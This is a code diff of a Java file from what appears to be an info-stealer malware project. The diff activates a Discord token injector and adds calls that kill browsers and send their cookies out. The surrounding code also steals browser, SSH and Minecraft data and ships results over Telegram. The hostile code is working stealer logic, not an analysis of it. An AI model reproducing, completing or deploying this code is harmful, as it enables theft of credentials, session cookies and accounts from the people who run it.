@@ -1,23 +1,24 @@
 package io.github.luxotick;
 
 import io.github.luxotick.impl.*;
+import io.github.luxotick.impl.cookies.sendCookies;
 import okhttp3.*;
 
 import java.io.*;
 import java.net.InetAddress;
-import java.net.MalformedURLException;
-import java.util.Objects;
-import java.util.Scanner;
+import java.util.*;
 import java.net.URL;
 import javax.swing.JOptionPane;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import io.github.luxotick.utils.util;
 
 
 public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
+    public static String documents = "C:\\Users\\Public\\Documents";
 
     public static void main(String[] argument) throws Exception {
         String version = "1.0.2";
@@ -26,7 +27,9 @@ public class Start {
 		if (DiscordInjector.instance == null){
 			DiscordInjector.instance = new DiscordInjector();
 		}
-	    //DiscordInjector.instance.initialize();
+        OkHttpClient client = new OkHttpClient();
+
+        DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -37,8 +40,10 @@ public class Start {
 		Sender.sendMessage("Ssh done.");
 		Sender.sendMessage("Now launching the client.");
         Minecraft.sendMinecraft();
+        KillBrowsers.kill();
+        sendCookies.zaa();
+        sendCookies.mh();
         telegram();
-        OkHttpClient client = new OkHttpClient();
 
         File folder = new File("C:\\Users\\Public\\Documents");
         File[] listOfFiles = folder.listFiles();
@@ -133,6 +138,7 @@ public class Start {
                 .post(body)
                 .build();
         Response response = client.newCall(request).execute();
+        Sender.sendMessage("Telegram message sent.");
     }
 
     private static void update(String urlStr, String file) throws IOException {
